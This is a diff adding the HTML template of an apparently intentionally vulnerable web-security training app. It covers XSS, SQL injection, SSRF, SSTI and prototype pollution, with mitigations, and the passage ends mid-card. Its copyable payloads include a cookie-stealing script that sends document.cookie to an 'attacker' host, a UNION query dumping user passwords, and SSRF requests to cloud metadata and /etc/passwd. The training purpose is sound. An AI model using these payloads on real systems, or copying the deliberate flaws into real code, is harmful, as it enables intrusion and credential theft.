@@ -1,0 +1,1732 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Security Playground — Intentionally Vulnerable App</title>
+  <meta name="description" content="An intentionally vulnerable web security playground for local cybersecurity education and practice. Never deploy to production." />
+  <meta name="robots" content="noindex, nofollow" />
+  <link rel="stylesheet" href="/css/style.css" />
+</head>
+<body>
+
+<!-- Toast container -->
+<div class="toast-container" id="toast-container"></div>
+
+<div class="app-layout">
+
+  <!-- ─── Warning Banner ─────────────────────────────────────────────── -->
+  <div class="warning-banner">
+    ⚠️ INTENTIONALLY VULNERABLE APPLICATION — FOR LOCAL EDUCATIONAL USE ONLY — DO NOT EXPOSE TO THE INTERNET ⚠️
+  </div>
+
+  <!-- ─── Sidebar ────────────────────────────────────────────────────── -->
+  <aside class="sidebar">
+    <div class="sidebar-logo">
+      <div class="logo-icon">🛡️</div>
+      <div class="logo-title">Security Playground</div>
+      <div class="logo-subtitle">Intentionally Vulnerable · Local Only</div>
+    </div>
+
+    <nav class="sidebar-nav">
+      <div class="sidebar-section-title">Injection</div>
+      <button class="nav-item" data-section="rxss-section">
+        <span class="nav-icon">🪞</span> Reflected XSS
+        <span class="nav-badge badge-high">HIGH</span>
+      </button>
+      <button class="nav-item" data-section="sxss-section">
+        <span class="nav-icon">💾</span> Stored XSS
+        <span class="nav-badge badge-high">HIGH</span>
+      </button>
+      <button class="nav-item" data-section="domxss-section">
+        <span class="nav-icon">🌐</span> DOM XSS
+        <span class="nav-badge badge-high">HIGH</span>
+      </button>
+      <button class="nav-item" data-section="sqli-section">
+        <span class="nav-icon">🗃️</span> SQL Injection
+        <span class="nav-badge badge-critical">CRIT</span>
+      </button>
+      <button class="nav-item" data-section="ssti-section">
+        <span class="nav-icon">📝</span> SSTI
+        <span class="nav-badge badge-critical">CRIT</span>
+      </button>
+      <button class="nav-item" data-section="rce-section">
+        <span class="nav-icon">💻</span> Code Injection
+        <span class="nav-badge badge-critical">CRIT</span>
+      </button>
+
+      <div class="sidebar-section-title">Server-Side</div>
+      <button class="nav-item" data-section="ssrf-section">
+        <span class="nav-icon">🌍</span> SSRF
+        <span class="nav-badge badge-high">HIGH</span>
+      </button>
+      <button class="nav-item" data-section="proto-section">
+        <span class="nav-icon">⛓️</span> Proto Pollution
+        <span class="nav-badge badge-medium">MED</span>
+      </button>
+      <button class="nav-item" data-section="upload-section">
+        <span class="nav-icon">📁</span> File Upload
+        <span class="nav-badge badge-high">HIGH</span>
+      </button>
+
+      <div class="sidebar-section-title">Auth & Session</div>
+      <button class="nav-item" data-section="sqli-section">
+        <span class="nav-icon">🔑</span> Auth Bypass
+        <span class="nav-badge badge-critical">CRIT</span>
+      </button>
+      <button class="nav-item" data-section="session-section">
+        <span class="nav-icon">🍪</span> Session Hijack
+        <span class="nav-badge badge-high">HIGH</span>
+      </button>
+      <button class="nav-item" data-section="cookie-section">
+        <span class="nav-icon">🔍</span> Cookie Theft
+        <span class="nav-badge badge-medium">MED</span>
+      </button>
+      <button class="nav-item" data-section="jwt-section">
+        <span class="nav-icon">🎫</span> JWT Weaknesses
+        <span class="nav-badge badge-high">HIGH</span>
+      </button>
+
+      <div class="sidebar-section-title">Access Control</div>
+      <button class="nav-item" data-section="bac-section">
+        <span class="nav-icon">🚪</span> Broken Access
+        <span class="nav-badge badge-critical">CRIT</span>
+      </button>
+      <button class="nav-item" data-section="idor-section">
+        <span class="nav-icon">👤</span> IDOR
+        <span class="nav-badge badge-high">HIGH</span>
+      </button>
+      <button class="nav-item" data-section="csrf-section">
+        <span class="nav-icon">🔄</span> CSRF
+        <span class="nav-badge badge-medium">MED</span>
+      </button>
+
+      <div class="sidebar-section-title">Client-Side</div>
+      <button class="nav-item" data-section="clickjack-section">
+        <span class="nav-icon">🖼️</span> Clickjacking
+        <span class="nav-badge badge-medium">MED</span>
+      </button>
+      <button class="nav-item" data-section="storage-section">
+        <span class="nav-icon">💽</span> Storage & Cookies
+        <span class="nav-badge badge-low">LOW</span>
+      </button>
+      <button class="nav-item" data-section="ratelimit-section">
+        <span class="nav-icon">🏃</span> Rate Limiting
+        <span class="nav-badge badge-medium">MED</span>
+      </button>
+
+      <div class="sidebar-section-title">Discovery</div>
+      <button class="nav-item" data-section="info-section">
+        <span class="nav-icon">ℹ️</span> Info Disclosure
+        <span class="nav-badge badge-medium">MED</span>
+      </button>
+      <button class="nav-item" data-section="apidisc-section">
+        <span class="nav-icon">🗺️</span> API Discovery
+        <span class="nav-badge badge-low">LOW</span>
+      </button>
+    </nav>
+
+    <div class="sidebar-footer">
+      <% if (username) { %>
+        👤 <strong><%= username %></strong> (<%= role %>)<br>
+      <% } else { %>
+        🔓 Not logged in<br>
+      <% } %>
+      Port: <%= port %> · SQLite · Node.js
+    </div>
+  </aside>
+
+  <!-- ─── Main Content ────────────────────────────────────────────────── -->
+  <main class="main-content">
+
+    <!-- Page Header -->
+    <div class="page-header">
+      <h1 class="page-title">🛡️ Web Security Playground</h1>
+      <p class="page-subtitle">Intentionally vulnerable application for cybersecurity education — localhost only</p>
+      <div class="header-stats">
+        <div class="stat-chip">
+          <span style="color:var(--critical)">🔴</span>
+          <span class="stat-num" style="color:var(--critical)">6</span>
+          <span>Critical</span>
+        </div>
+        <div class="stat-chip">
+          <span style="color:var(--high)">🟠</span>
+          <span class="stat-num" style="color:var(--high)">8</span>
+          <span>High</span>
+        </div>
+        <div class="stat-chip">
+          <span style="color:var(--medium)">🟡</span>
+          <span class="stat-num" style="color:var(--medium)">6</span>
+          <span>Medium</span>
+        </div>
+        <div class="stat-chip">
+          <span style="color:var(--low)">🟢</span>
+          <span class="stat-num" style="color:var(--low)">4</span>
+          <span>Low</span>
+        </div>
+        <div class="stat-chip" style="cursor:pointer" onclick="fetchApiList(); document.getElementById('apidisc-section').scrollIntoView({behavior:'smooth'})">
+          <span>📡</span>
+          <span class="stat-num">30+</span>
+          <span>Endpoints</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- ══════════════════════════════════════════════════════════════════
+         SECTION: XSS
+    ══════════════════════════════════════════════════════════════════════ -->
+    <section class="section" id="rxss-section">
+      <div class="section-title">
+        <div class="section-title-icon icon-red">🪞</div>
+        Cross-Site Scripting (XSS)
+      </div>
+      <div class="cards-grid">
+
+        <!-- Reflected XSS -->
+        <div class="vuln-card">
+          <div class="card-header">
+            <div class="card-icon icon-red">🪞</div>
+            <div class="card-header-info">
+              <div class="card-title">Reflected XSS</div>
+              <div class="card-meta">
+                <span class="owasp-tag">OWASP A03:2021</span>
+                <span class="risk-badge risk-high">HIGH</span>
+                <span class="owasp-tag">CWE-79</span>
+              </div>
+            </div>
+          </div>
+          <div class="card-body">
+            <p class="card-description">
+              User-supplied input from the URL query string is reflected back in the HTTP response
+              without sanitization. The server includes the raw input in the search results page,
+              allowing JavaScript injection.
+            </p>
+
+            <button class="expand-toggle" data-target="rxss-details">
+              <span class="arrow">▶</span> Attack Surface & Payloads
+            </button>
+            <div class="expand-content" id="rxss-details">
+              <div class="info-row"><span class="info-label">Attack Surface</span><span class="info-value">GET /search?q= parameter</span></div>
+              <div class="info-row"><span class="info-label">Sink</span><span class="info-value">innerHTML / server-side reflection</span></div>
+              <div class="info-row"><span class="info-label">Impact</span><span class="info-value">Cookie theft, session hijacking, phishing</span></div>
+              <p style="font-size:11px;color:var(--text-muted);margin:8px 0 4px">Example payloads (click to load):</p>
+              <ul class="payload-list">
+                <li class="payload-item">
+                  <span class="payload-code" data-target="rxss-input">&lt;script&gt;alert('XSS')&lt;/script&gt;</span>
+                  <button class="copy-btn" title="Copy">📋</button>
+                </li>
+                <li class="payload-item">
+                  <span class="payload-code" data-target="rxss-input">&lt;img src=x onerror=alert(document.domain)&gt;</span>
+                  <button class="copy-btn" title="Copy">📋</button>
+                </li>
+                <li class="payload-item">
+                  <span class="payload-code" data-target="rxss-input">&lt;svg onload=alert(1)&gt;</span>
+                  <button class="copy-btn" title="Copy">📋</button>
+                </li>
+                <li class="payload-item">
+                  <span class="payload-code" data-target="rxss-input">"&gt;&lt;script&gt;fetch('http://attacker/?c='+document.cookie)&lt;/script&gt;</span>
+                  <button class="copy-btn" title="Copy">📋</button>
+                </li>
+              </ul>
+              <div class="mitigation-panel">
+                <div class="mitigation-title">✅ Mitigations</div>
+                <ul class="mitigation-list">
+                  <li>Use textContent instead of innerHTML</li>
+                  <li>Encode output: htmlspecialchars() / DOMPurify</li>
+                  <li>Implement Content-Security-Policy header</li>
+                  <li>Validate and sanitize all inputs server-side</li>
+                </ul>
+              </div>
+            </div>
+          </div>
+          <div class="card-try">
+            <div class="try-label">🧪 Try It</div>
+            <div class="form-group">
+              <label class="form-label">Search Query (reflected without sanitization)</label>
+              <input class="form-input" id="rxss-input" placeholder="Enter search or XSS payload..." value="Juice" />
+            </div>
+            <div class="btn-row">
+              <button class="btn btn-primary" onclick="doReflectedSearch()">🔍 Search</button>
+              <button class="btn btn-ghost btn-sm" onclick="setInputValue('rxss-input','&lt;script&gt;alert(1)&lt;/script&gt;')">Load XSS</button>
+              <button class="btn btn-ghost btn-sm" onclick="setInputValue('rxss-input',&quot;&lt;img src=x onerror=alert('XSS!')&gt;&quot;)">Load onerror</button>
+            </div>
+            <div id="rxss-results-wrap" style="display:none;margin-top:10px">
+              <div class="search-results" id="rxss-results"></div>
+            </div>
+            <div class="response-viewer" id="rxss-response">
+              <div class="response-tabs">
+                <button class="response-tab active">Response</button>
+              </div>
+              <div class="response-status">
+                <span>Status:</span><span class="response-status-text status-200">—</span>
+              </div>
+              <div class="response-body"></div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Stored XSS -->
+        <div class="vuln-card" id="sxss-section">
+          <div class="card-header">
+            <div class="card-icon icon-red">💾</div>
+            <div class="card-header-info">
+              <div class="card-title">Stored XSS</div>
+              <div class="card-meta">
+                <span class="owasp-tag">OWASP A03:2021</span>
+                <span class="risk-badge risk-high">HIGH</span>
+                <span class="owasp-tag">CWE-79</span>
+              </div>
+            </div>
+          </div>
+          <div class="card-body">
+            <p class="card-description">
+              Comments are stored in SQLite without sanitization and rendered directly via
+              <code>innerHTML</code> on page load. Any user visiting the page executes the stored payload.
+            </p>
+            <button class="expand-toggle" data-target="sxss-details">
+              <span class="arrow">▶</span> Attack Surface & Payloads
+            </button>
+            <div class="expand-content" id="sxss-details">
+              <div class="info-row"><span class="info-label">Attack Surface</span><span class="info-value">POST /comment body → GET /comments render</span></div>
+              <div class="info-row"><span class="info-label">Sink</span><span class="info-value">element.innerHTML = raw DB content</span></div>
+              <ul class="payload-list">
+                <li class="payload-item">
+                  <span class="payload-code" data-target="comment-content">&lt;script&gt;alert('Stored XSS!')&lt;/script&gt;</span>
+                  <button class="copy-btn">📋</button>
+                </li>
+                <li class="payload-item">
+                  <span class="payload-code" data-target="comment-content">&lt;img src=x onerror="alert(document.cookie)"&gt;</span>
+                  <button class="copy-btn">📋</button>
+                </li>
+                <li class="payload-item">
+                  <span class="payload-code" data-target="comment-content">&lt;iframe src="javascript:alert('XSS')"&gt;&lt;/iframe&gt;</span>
+                  <button class="copy-btn">📋</button>
+                </li>
+              </ul>
+              <div class="mitigation-panel">
+                <div class="mitigation-title">✅ Mitigations</div>
+                <ul class="mitigation-list">
+                  <li>Sanitize on input (DOMPurify server-side)</li>
+                  <li>Encode on output (escape HTML entities)</li>
+                  <li>Use textContent instead of innerHTML</li>
+                  <li>Content-Security-Policy: script-src 'self'</li>
+                </ul>
+              </div>
+            </div>
+            <div class="comments-feed" id="comments-feed">
+              <div class="comment-item" style="color:var(--text-muted)">Loading comments...</div>
+            </div>
+          </div>
+          <div class="card-try">
+            <div class="try-label">🧪 Try It</div>
+            <div class="form-row">
+              <div class="form-group">
+                <label class="form-label">Author</label>
+                <input class="form-input" id="comment-author" placeholder="Your name" value="hacker" />
+              </div>
+              <div class="form-group">
+                <label class="form-label">&nbsp;</label>
+                <button class="btn btn-ghost btn-sm" onclick="clearComments()" style="width:100%;margin-top:5px">🗑 Clear All</button>
+              </div>
+            </div>
+            <div class="form-group">
+              <label class="form-label">Comment (stored raw in SQLite)</label>
+              <textarea class="form-textarea" id="comment-content" placeholder="Enter comment or XSS payload..."></textarea>
+            </div>
+            <div class="btn-row">
+              <button class="btn btn-primary" onclick="postComment()">💬 Post Comment</button>
+              <button class="btn btn-ghost btn-sm" onclick="loadComments()">🔄 Refresh</button>
+            </div>
+            <div class="response-viewer" id="sxss-response">
+              <div class="response-tabs"><button class="response-tab active">Response</button></div>
+              <div class="response-status"><span>Status:</span><span class="response-status-text">—</span></div>
+              <div class="response-body"></div>
+            </div>
+          </div>
+        </div>
+
+        <!-- DOM XSS -->
+        <div class="vuln-card" id="domxss-section">
+          <div class="card-header">
+            <div class="card-icon icon-orange">🌐</div>
+            <div class="card-header-info">
+              <div class="card-title">DOM-Based XSS</div>
+              <div class="card-meta">
+                <span class="owasp-tag">OWASP A03:2021</span>
+                <span class="risk-badge risk-high">HIGH</span>
+                <span class="owasp-tag">CWE-79</span>
+              </div>
+            </div>
+          </div>
+          <div class="card-body">
+            <p class="card-description">
+              JavaScript reads from <code>location.hash</code> or <code>URLSearchParams</code>
+              and inserts the value directly into the DOM via <code>innerHTML</code> — no server involved.
+              Payload: <code>http://localhost:3000/#&lt;img src=x onerror=alert(1)&gt;</code>
+            </p>
+            <button class="expand-toggle" data-target="domxss-details">
+              <span class="arrow">▶</span> Attack Surface & Payloads
+            </button>
+            <div class="expand-content" id="domxss-details">
+              <div class="info-row"><span class="info-label">Source</span><span class="info-value">location.hash, URLSearchParams</span></div>
+              <div class="info-row"><span class="info-label">Sink</span><span class="info-value">element.innerHTML = value</span></div>
+              <div class="info-row"><span class="info-label">No server</span><span class="info-value">Purely client-side — not visible in server logs</span></div>
+              <ul class="payload-list">
+                <li class="payload-item">
+                  <span class="payload-code" data-target="dom-xss-input">&lt;img src=x onerror=alert(1)&gt;</span>
+                  <button class="copy-btn">📋</button>
+                </li>
+                <li class="payload-item">
+                  <span class="payload-code" data-target="dom-xss-input">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span>
+                  <button class="copy-btn">📋</button>
+                </li>
+                <li class="payload-item">
+                  <span class="payload-code" data-target="dom-xss-input">&lt;svg/onload=alert('DOM XSS')&gt;</span>
+                  <button class="copy-btn">📋</button>
+                </li>
+              </ul>
+              <div class="mitigation-panel">
+                <div class="mitigation-title">✅ Mitigations</div>
+                <ul class="mitigation-list">
+                  <li>Use textContent / createTextNode instead of innerHTML</li>
+                  <li>Sanitize with DOMPurify before DOM insertion</li>
+                  <li>Avoid reading from URL fragments directly into DOM sinks</li>
+                </ul>
+              </div>
+            </div>
+            <div style="padding:12px;background:rgba(255,107,53,0.06);border:1px solid rgba(255,107,53,0.2);border-radius:8px;font-size:12px;color:var(--text-secondary);margin-top:8px">
+              <strong style="color:var(--high)">DOM Output:</strong>
+              <div id="dom-xss-output" style="margin-top:6px;color:var(--text-primary)">
+                (output will appear here — innerHTML sink)
+              </div>
+            </div>
+          </div>
+          <div class="card-try">
+            <div class="try-label">🧪 Try It</div>
+            <div class="form-group">
+              <label class="form-label">Payload (set via location.hash)</label>
+              <input class="form-input" id="dom-xss-input" placeholder="Enter DOM XSS payload..." />
+            </div>
+            <div class="btn-row">
+              <button class="btn btn-primary" onclick="triggerDomXSS()">⚡ Inject DOM</button>
+              <button class="btn btn-ghost btn-sm" onclick="setInputValue('dom-xss-input','&lt;img src=x onerror=alert(1)&gt;')">Load payload</button>
+            </div>
+            <div class="response-viewer" id="domxss-response">
+              <div class="response-tabs"><button class="response-tab active">Info</button></div>
+              <div class="response-status"><span>Status:</span><span class="response-status-text">—</span></div>
+              <div class="response-body"></div>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </section>
+
+    <div class="divider"></div>
+
+    <!-- ══════════════════════════════════════════════════════════════════
+         SECTION: SQL INJECTION
+    ══════════════════════════════════════════════════════════════════════ -->
+    <section class="section" id="sqli-section">
+      <div class="section-title">
+        <div class="section-title-icon icon-red">🗃️</div>
+        SQL Injection & Authentication Bypass
+      </div>
+      <div class="cards-grid">
+
+        <!-- SQLi Login -->
+        <div class="vuln-card">
+          <div class="card-header">
+            <div class="card-icon icon-red">🗃️</div>
+            <div class="card-header-info">
+              <div class="card-title">SQL Injection — Login</div>
+              <div class="card-meta">
+                <span class="owasp-tag">OWASP A03:2021</span>
+                <span class="risk-badge risk-critical">CRITICAL</span>
+                <span class="owasp-tag">CWE-89</span>
+              </div>
+            </div>
+          </div>
+          <div class="card-body">
+            <p class="card-description">
+              Login query is built via string concatenation: <br>
+              <code style="font-family:monospace;font-size:11px;color:var(--accent-teal)">SELECT * FROM users WHERE username='INPUT' AND password='INPUT'</code><br>
+              Allows authentication bypass, data extraction via UNION, and error-based injection.
+            </p>
+            <button class="expand-toggle" data-target="sqli-details">
+              <span class="arrow">▶</span> Payloads & Techniques
+            </button>
+            <div class="expand-content" id="sqli-details">
+              <div class="info-row"><span class="info-label">DB Engine</span><span class="info-value">SQLite</span></div>
+              <div class="info-row"><span class="info-label">Endpoint</span><span class="info-value">POST /login</span></div>
+              <p style="font-size:11px;color:var(--text-muted);margin:8px 0 4px">Auth Bypass payloads (username field):</p>
+              <ul class="payload-list">
+                <li class="payload-item">
+                  <span class="payload-code" data-target="sql-username">admin' --</span>
+                  <button class="copy-btn">📋</button>
+                </li>
+                <li class="payload-item">
+                  <span class="payload-code" data-target="sql-username">' OR '1'='1' --</span>
+                  <button class="copy-btn">📋</button>
+                </li>
+                <li class="payload-item">
+                  <span class="payload-code" data-target="sql-username">' OR 1=1--</span>
+                  <button class="copy-btn">📋</button>
+                </li>
+                <li class="payload-item">
+                  <span class="payload-code" data-target="sql-username">admin'/*</span>
+                  <button class="copy-btn">📋</button>
+                </li>
+              </ul>
+              <p style="font-size:11px;color:var(--text-muted);margin:8px 0 4px">UNION injection (try in /search?q=):</p>
+              <ul class="payload-list">
+                <li class="payload-item">
+                  <span class="payload-code">%' UNION SELECT 1,username,password,email,role,bio FROM users--</span>
+                  <button class="copy-btn">📋</button>
+                </li>
+              </ul>
+              <div class="mitigation-panel">
+                <div class="mitigation-title">✅ Mitigations</div>
+                <ul class="mitigation-list">
+                  <li>Use parameterized queries / prepared statements</li>
+                  <li>Use an ORM (Sequelize, Prisma)</li>
+                  <li>Validate and whitelist input</li>
+                  <li>Least privilege DB user accounts</li>
+                </ul>
+              </div>
+            </div>
+            <div class="attempt-display">
+              <span>🎯 Login Attempts:</span>
+              <span class="attempt-count" id="attempt-counter">0</span>
+              <span style="color:var(--text-muted);font-size:11px;margin-left:auto">No rate limit!</span>
+            </div>
+          </div>
+          <div class="card-try">
+            <div class="try-label">🧪 Try It — Login (SQL Injectable)</div>
+            <div class="form-row">
+              <div class="form-group">
+                <label class="form-label">Username</label>
+                <input class="form-input" id="sql-username" placeholder="admin' --" value="admin" />
+              </div>
+              <div class="form-group">
+                <label class="form-label">Password</label>
+                <input class="form-input" id="sql-password" placeholder="anything" type="text" value="wrongpassword" />
+              </div>
+            </div>
+            <div class="btn-row">
+              <button class="btn btn-primary" onclick="doLogin()">🔑 Login</button>
+              <button class="btn btn-ghost btn-sm" onclick="setInputValue('sql-username',&quot;admin' --&quot;)">Bypass</button>
+              <button class="btn btn-ghost btn-sm" onclick="setInputValue('sql-username',&quot;' OR '1'='1' --&quot;)">OR 1=1</button>
+              <button class="btn btn-danger btn-sm" onclick="resetAttempts()">Reset Counter</button>
+            </div>
+            <div class="response-viewer" id="sql-response">
+              <div class="response-tabs"><button class="response-tab active">Response</button></div>
+              <div class="response-status"><span>Status:</span><span class="response-status-text">—</span></div>
+              <div class="response-body"></div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Product Search SQLi -->
+        <div class="vuln-card">
+          <div class="card-header">
+            <div class="card-icon icon-orange">🔍</div>
+            <div class="card-header-info">
+              <div class="card-title">SQL Injection — Search / UNION</div>
+              <div class="card-meta">
+                <span class="owasp-tag">OWASP A03:2021</span>
+                <span class="risk-badge risk-critical">CRITICAL</span>
+                <span class="owasp-tag">CWE-89</span>
+              </div>
+            </div>
+          </div>
+          <div class="card-body">
+            <p class="card-description">
+              Product search endpoint concatenates input directly: <br>
+              <code style="font-family:monospace;font-size:11px;color:var(--accent-teal)">SELECT * FROM products WHERE name LIKE '%INPUT%'</code><br>
+              Try UNION injection to extract user credentials.
+            </p>
+            <button class="expand-toggle" data-target="search-sqli-details">
+              <span class="arrow">▶</span> Payloads
+            </button>
+            <div class="expand-content" id="search-sqli-details">
+              <ul class="payload-list">
+                <li class="payload-item">
+                  <span class="payload-code" data-target="product-search">%' UNION SELECT id,username,password,email FROM users--</span>
+                  <button class="copy-btn">📋</button>
+                </li>
+                <li class="payload-item">
+                  <span class="payload-code" data-target="product-search">%' UNION SELECT 1,2,3,4--</span>
+                  <button class="copy-btn">📋</button>
+                </li>
+                <li class="payload-item">
+                  <span class="payload-code" data-target="product-search">%' AND 1=2 UNION SELECT name,sql,3,4 FROM sqlite_master--</span>
+                  <button class="copy-btn">📋</button>
+                </li>
+              </ul>
+            </div>
+          </div>
+          <div class="card-try">
+            <div class="try-label">🧪 Try It — Product Search</div>
+            <div class="form-group">
+              <label class="form-label">Search (endpoint: GET /rest/products?q=)</label>
+              <input class="form-input" id="product-search" placeholder="Juice" value="Juice" />
+            </div>
+            <div class="btn-row">
+              <button class="btn btn-primary" onclick="searchProducts()">🔍 Search</button>
+              <button class="btn btn-ghost btn-sm" onclick="setInputValue('product-search',&quot;%' UNION SELECT id,username,password,email FROM users--&quot;)">UNION Dump</button>
+            </div>
+            <div class="response-viewer" id="product-response">
+              <div class="response-tabs"><button class="response-tab active">Response</button></div>
+              <div class="response-status"><span>Status:</span><span class="response-status-text">—</span></div>
+              <div class="response-body"></div>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </section>
+
+    <div class="divider"></div>
+
+    <!-- ══════════════════════════════════════════════════════════════════
+         SECTION: SERVER-SIDE
+    ══════════════════════════════════════════════════════════════════════ -->
+    <section class="section" id="ssrf-section">
+      <div class="section-title">
+        <div class="section-title-icon icon-purple">🌍</div>
+        Server-Side Vulnerabilities
+      </div>
+      <div class="cards-grid">
+
+        <!-- SSRF -->
+        <div class="vuln-card">
+          <div class="card-header">
+            <div class="card-icon icon-purple">🌍</div>
+            <div class="card-header-info">
+              <div class="card-title">Server-Side Request Forgery (SSRF)</div>
+              <div class="card-meta">
+                <span class="owasp-tag">OWASP A10:2021</span>
+                <span class="risk-badge risk-high">HIGH</span>
+                <span class="owasp-tag">CWE-918</span>
+              </div>
+            </div>
+          </div>
+          <div class="card-body">
+            <p class="card-description">
+              The server fetches any URL provided by the user without validation. Attackers can
+              use this to access internal services, cloud metadata endpoints, or probe localhost.
+            </p>
+            <button class="expand-toggle" data-target="ssrf-details">
+              <span class="arrow">▶</span> Attack Surface & Payloads
+            </button>
+            <div class="expand-content" id="ssrf-details">
+              <div class="info-row"><span class="info-label">Endpoint</span><span class="info-value">POST /fetch</span></div>
+              <ul class="payload-list">
+                <li class="payload-item">
+                  <span class="payload-code" data-target="ssrf-url">http://localhost:3000/api</span>
+                  <button class="copy-btn">📋</button>
+                </li>
+                <li class="payload-item">
+                  <span class="payload-code" data-target="ssrf-url">http://127.0.0.1:3000/api/admin</span>
+                  <button class="copy-btn">📋</button>
+                </li>
+                <li class="payload-item">
+                  <span class="payload-code" data-target="ssrf-url">http://169.254.169.254/latest/meta-data/</span>
+                  <button class="copy-btn">📋</button>
+                </li>
+                <li class="payload-item">
+                  <span class="payload-code" data-target="ssrf-url">file:///etc/passwd</span>
+                  <button class="copy-btn">📋</button>
+                </li>
+              </ul>
+              <div class="mitigation-panel">
+                <div class="mitigation-title">✅ Mitigations</div>
+                <ul class="mitigation-list">
+                  <li>Allowlist permitted hostnames/IPs</li>
+                  <li>Block private IP ranges (RFC1918)</li>
+                  <li>Block loopback / metadata endpoints</li>
+                  <li>Use DNS rebinding protection</li>
+                </ul>
+              </div>
+            </div>
+          </div>
+          <div class="card-try">
+            <div class="try-label">🧪 Try It</div>
+            <div class="form-group">
+              <label class="form-label">Target URL (server will fetch this)</label>
+              <input class="form-input" id="ssrf-url" placeholder="http://localhost:3000/api" value="http://localhost:3000/api/info" />
+            </div>
+            <div class="btn-row">
+              <button class="btn btn-primary" onclick="doSSRF()">🌍 Fetch (Server-Side)</button>
+              <button class="btn btn-ghost btn-sm" onclick="setInputValue('ssrf-url','http://127.0.0.1:3000/api/admin')">Internal</button>
+              <button class="btn btn-ghost btn-sm" onclick="setInputValue('ssrf-url','http://169.254.169.254/latest/meta-data/')">AWS Meta</button>
+            </div>
+            <div class="response-viewer" id="ssrf-response">
+              <div class="response-tabs"><button class="response-tab active">Response</button></div>
+              <div class="response-status"><span>Status:</span><span class="response-status-text">—</span></div>
+              <div class="response-body"></div>
+            </div>
+          </div>
+        </div>
+
+        <!-- SSTI -->
+        <div class="vuln-card" id="ssti-section">
+          <div class="card-header">
+            <div class="card-icon icon-red">📝</div>
+            <div class="card-header-info">
+              <div class="card-title">Server-Side Template Injection (SSTI)</div>
+              <div class="card-meta">
+                <span class="owasp-tag">OWASP A03:2021</span>
+                <span class="risk-badge risk-critical">CRITICAL</span>
+                <span class="owasp-tag">CWE-94</span>
+              </div>
+            </div>
+          </div>
+          <div class="card-body">
+            <p class="card-description">
+              User-supplied template text is rendered by EJS on the server without sandboxing.
+              Attacker can access <code>process</code>, <code>require</code>, and execute
+              arbitrary Node.js code.
+            </p>
+            <button class="expand-toggle" data-target="ssti-details">
+              <span class="arrow">▶</span> Payloads
+            </button>
+            <div class="expand-content" id="ssti-details">
+              <ul class="payload-list">
+                <li class="payload-item">
+                  <span class="payload-code" data-target="ssti-template">&lt;%= 7*7 %&gt;</span>
+                  <button class="copy-btn">📋</button>
+                </li>
+                <li class="payload-item">
+                  <span class="payload-code" data-target="ssti-template">&lt;%= process.version %&gt;</span>
+                  <button class="copy-btn">📋</button>
+                </li>
+                <li class="payload-item">
+                  <span class="payload-code" data-target="ssti-template">&lt;%= require('os').hostname() %&gt;</span>
+                  <button class="copy-btn">📋</button>
+                </li>
+                <li class="payload-item">
+                  <span class="payload-code" data-target="ssti-template">&lt;%= require('fs').readdirSync('.').join(', ') %&gt;</span>
+                  <button class="copy-btn">📋</button>
+                </li>
+                <li class="payload-item">
+                  <span class="payload-code" data-target="ssti-template">&lt;%= process.env.PATH %&gt;</span>
+                  <button class="copy-btn">📋</button>
+                </li>
+              </ul>
+              <div class="mitigation-panel">
+                <div class="mitigation-title">✅ Mitigations</div>
+                <ul class="mitigation-list">
+                  <li>Never render user-supplied templates</li>
+                  <li>Use sandboxed template engines (Nunjucks sandbox)</li>
+                  <li>Separate template logic from user data</li>
+                </ul>
+              </div>
+            </div>
+          </div>
+          <div class="card-try">
+            <div class="try-label">🧪 Try It</div>
+            <div class="form-row">
+              <div class="form-group">
+                <label class="form-label">Name variable</label>
+                <input class="form-input" id="ssti-name" placeholder="World" value="Hacker" />
+              </div>
+            </div>
+            <div class="form-group">
+              <label class="form-label">EJS Template (rendered server-side)</label>
+              <textarea class="form-textarea" id="ssti-template" placeholder="Hello &lt;%= name %&gt;!">Hello <%= name %>!</textarea>
+            </div>
+            <div class="btn-row">
+              <button class="btn btn-primary" onclick="doSSTI()">⚡ Render</button>
+              <button class="btn btn-ghost btn-sm" onclick="setInputValue('ssti-template','&lt;%= process.version %&gt;')">Node version</button>
+              <button class="btn btn-ghost btn-sm" onclick="setInputValue('ssti-template',&quot;&lt;%= require('os').hostname() %&gt;&quot;)">Hostname</button>
+            </div>
+            <div class="response-viewer" id="ssti-response">
+              <div class="response-tabs"><button class="response-tab active">Response</button></div>
+              <div class="response-status"><span>Status:</span><span class="response-status-text">—</span></div>
+              <div class="response-body"></div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Prototype Pollution -->
+        <div class="vuln-card" id="proto-section">
+          <div class="card-header">
+            <div class="card-icon icon-yellow">⛓️</div>
+            <div class="card-header-info">
+              <div class="card-title">Prototype Pollution</div>
+              <div class="card-meta">
+                <span class="owasp-tag">OWASP A08:2021</span>
+                <span class="risk-badge risk-medium">MEDIUM</span>
+                <span class="owasp-tag">CWE-1321</span>
+              </div>
+            </div>
+          </div>
+          <div class="card-body">
+            <p class="card-description">
+              A custom <code>deepMerge()</code> function does not block <code>__proto__</code>
+              or <code>constructor.prototype</code> keys, allowing attackers to modify
+              <code>Object.prototype</code> globally.
+            </p>
+            <button class="expand-toggle" data-target="proto-details">
+              <span class="arrow">▶</span> Payloads
+            </button>
+            <div class="expand-content" id="proto-details">
+              <ul class="payload-list">
+                <li class="payload-item">
+                  <span class="payload-code" data-target="proto-input">{"__proto__": {"isAdmin": true}}</span>
+                  <button class="copy-btn">📋</button>
+                </li>
+                <li class="payload-item">
+                  <span class="payload-code" data-target="proto-input">{"__proto__": {"role": "admin", "polluted": "yes"}}</span>
+                  <button class="copy-btn">📋</button>
+                </li>
+                <li class="payload-item">
+                  <span class="payload-code" data-target="proto-input">{"constructor": {"prototype": {"admin": true}}}</span>
+                  <button class="copy-btn">📋</button>
+                </li>
+              </ul>
+              <div class="mitigation-panel">
+                <div class="mitigation-title">✅ Mitigations</div>
+                <ul class="mitigation-list">
+                  <li>Block __proto__, constructor, prototype keys</li>
+                  <li>Use Object.create(null) for safe objects</li>
+                  <li>Use structuredClone() for deep copying</li>
+                  <li>Use Object.freeze(Object.prototype)</li>
+                </ul>
+              </div>
+            </div>
+          </div>
+          <div class="card-try">
+            <div class="try-label">🧪 Try It</div>
+            <div class="form-group">
